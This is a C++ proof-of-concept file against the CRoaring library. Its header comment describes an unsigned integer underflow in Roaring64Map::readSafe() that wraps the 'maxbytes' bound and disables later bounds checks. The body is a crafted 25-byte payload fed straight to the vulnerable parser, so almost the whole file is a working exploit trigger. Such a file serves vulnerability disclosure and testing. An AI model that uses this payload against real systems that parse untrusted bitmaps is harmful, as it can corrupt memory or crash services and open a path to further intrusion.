/**
 * Target: CRoaring (Roaring64Map)
 * Vulnerability: Integer Underflow in readSafe()
 * Credit: Oleg Lazari
 * * Description:
 * A malicious payload triggers an unsigned integer underflow during 
 * the parsing of the bitmap size. This causes a wrap-around of the 
 * 'maxbytes' variable, effectively disabling subsequent bounds checks.
 */

#include <iostream>
#include <vector>
#include "roaring/roaring64map.hh"

int main() {
    // Malicious payload (25 bytes)
    // Crafted to trigger tz > maxbytes in roaring64map.hh
    unsigned char payload[] = {
        0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x3b, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x6a, 0x6a, 0xd4
    };

    try {
        // Triggering the vulnerable read
        roaring::Roaring64Map::readSafe((const char*)payload, sizeof(payload));
    } catch (const std::exception& e) {
        std::cerr << "Caught exception: " << e.what() << std::endl;
    } catch (...) {
        std::cerr << "Caught unknown exception during parse." << std::endl;
    }
    
    return 0;
}
